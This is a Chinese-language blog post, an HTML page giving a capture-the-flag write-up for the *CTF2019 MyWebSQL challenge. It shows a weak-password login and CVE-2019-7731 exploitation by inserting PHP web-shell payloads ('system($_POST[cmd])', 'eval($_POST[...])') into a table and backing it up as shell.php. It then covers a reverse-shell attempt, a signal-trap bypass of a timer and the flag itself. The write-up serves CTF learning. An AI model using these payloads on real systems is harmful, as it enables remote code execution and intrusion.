<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> *CTF2019-MYWEBSQL WRITEUP · Imtinmin的小站</title><meta name="description" content="*CTF2019-MYWEBSQL WRITEUP - Imtinmin"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico?v=2018"><link rel="stylesheet" href="/css/style.css"><link rel="search" type="application/opensearchdescription+xml" href="http://imtinmin.github.io/atom.xml" title="Imtinmin的小站"><meta name="generator" content="Hexo 4.0.0"></head><body><div class="wrap"><header><h1 class="title">Imtinmin的小站</h1><ul class="nav nav-list"><li class="nav-list-item"><a class="nav-list-link" href="/" target="_self">HOME</a></li><li class="nav-list-item"><a class="nav-list-link" href="/archives/" target="_self">ARCHIVE</a></li><li class="nav-list-item"><a class="nav-list-link" href="/about" target="_self">ABOUT</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">*CTF2019-MYWEBSQL WRITEUP</h1><div class="post-info">2019-04-29</div><div class="post-content"><blockquote>
<p>比赛时卡在了执行<code>readflag</code>赛后复现2333</p>
</blockquote>
<p>环境还在：<a href="http://35.243.82.53:10080/" target="_blank" rel="noopener">http://35.243.82.53:10080/</a></p>
<h2 id="首页是MyWebSQL登录界面"><a href="#首页是MyWebSQL登录界面" class="headerlink" title="首页是MyWebSQL登录界面"></a>首页是MyWebSQL登录界面</h2><p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/3.png" alt="img"></p>
<p>猜测用户名弱密码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root root</span><br><span class="line">admin admin</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
<p><code>admin admin</code>登录成功</p>
<h2 id="谷歌MyWebSQL-CVE"><a href="#谷歌MyWebSQL-CVE" class="headerlink" title="谷歌MyWebSQL CVE"></a>谷歌MyWebSQL CVE</h2><p>发现了<a href="http://cve.circl.lu/cve/CVE-2019-7731" target="_blank" rel="noopener">CVE-2019-7731</a>,正好是最近的漏洞，出题人的最爱，点进去看到有一篇<a href="https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md" target="_blank" rel="noopener">分析</a><br>有漏洞复现过程：</p>
<ul>
<li>Create a test table (code) and write a shell code in this table.</li>
</ul>
<p>创建表，写入shell语句</p>
<ul>
<li>Execute Backup Database function and modify Backup filename as shell.php. </li>
</ul>
<p>备份数据表，名称改为shell.php<br>示例语句为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system($_POST[cmd]); ?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Browse (domain)/mywebsql/backups/shell.php?cmd=XXX. Here instance is cmd=ipconfig as below figure. </li>
</ul>
<p>然后文件就在backups目录下了</p>
<p>为了方便，我还是写入eval马方便蚁剑连接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create table `tinmin` (string VARCHAR(255));</span><br><span class="line">insert into `tinmin` (string) VALUES (&apos;&lt;?php eval($_POST[tinmin]); ?&gt;&apos;);</span><br></pre></td></tr></table></figure>

<p>查询就执行成功了<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/4.png" alt="img"><br>然后备份<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/5.png" alt="img"><br>蚁剑连接<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/6.png" alt="img"><br>打开终端<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/7.png" alt="img"><br>flag读不了，权限不够，执行根目录下的readflag，发现一下就跳过了<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/8.png" alt="img"></p>
<p>于是<code>cp readflag</code>到网站目录下载下来，IDA打开发现<code>ualarm计时操作</code><br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/9.png" alt="img"><br>比赛就卡在这里了，本地ubuntu pwntools跑也来不及</p>
<h2 id="尝试反弹shell"><a href="#尝试反弹shell" class="headerlink" title="尝试反弹shell"></a>尝试反弹shell</h2><p><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/2.png" alt="img"></p>
<p>这里我也不懂<code>tinmin.sh</code>为什么不能直接</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tinmin.sh</span><br></pre></td></tr></table></figure>
<p>发现运行不了，要<code>bash tinmin.sh</code></p>
<h2 id="让SIGALRM不作为"><a href="#让SIGALRM不作为" class="headerlink" title="让SIGALRM不作为"></a>让SIGALRM不作为</h2><p>有个 trap 命令能让<code>ualarm</code>不执行<br>参考：<a href="https://linuxconfig.org/how-to-modify-scripts-behavior-on-signals-using-bash-traps" target="_blank" rel="noopener">https://linuxconfig.org/how-to-modify-scripts-behavior-on-signals-using-bash-traps</a><br>终端输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">trap &quot;&quot; 14</span><br></pre></td></tr></table></figure>

<p>然后运行<code>readflag</code>，好了，可以慢慢算了<br><img src="https://raw.githubusercontent.com/wiki/imtinmin/photo/MyWebSQL/1.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ctf&#123;h4E9PKLkr6HTO3JcRglVdYaBSA0eDU8y&#125;</span><br></pre></td></tr></table></figure>

<p>后来看台湾balsn战队WP<br><a href="https://balsn.tw/ctf_writeup/20190427-*ctf/#solution-2:-mkfifo-trick" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190427-*ctf/#solution-2:-mkfifo-trick</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ mkfifo pipe</span><br><span class="line">$ cat pipe | ./readflag |(<span class="built_in">read</span> l;<span class="built_in">read</span> l;<span class="built_in">echo</span> <span class="string">"<span class="variable">$(($l)</span>)"</span> &gt; pipe;cat)</span><br><span class="line">input your answer: </span><br><span class="line">ok! here is your flag!! </span><br><span class="line">...</span><br></pre></td></tr></table></figure>


</div></article></div></main><footer><div class="paginator"><a class="prev" href="/2019/05/04/2019-5-4-CTF-md/">PREV</a></div><div class="copyright"><p>© 2019 PEACE & LOVE</p><p>Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>, <a href="https://github.com/jeremyfan/hexo-theme-still" target="_blank">theme</a> by <a href="https://github.com/jeremyfan" target="_blank">Imtinmin</a>.</p></div></footer></div></body></html>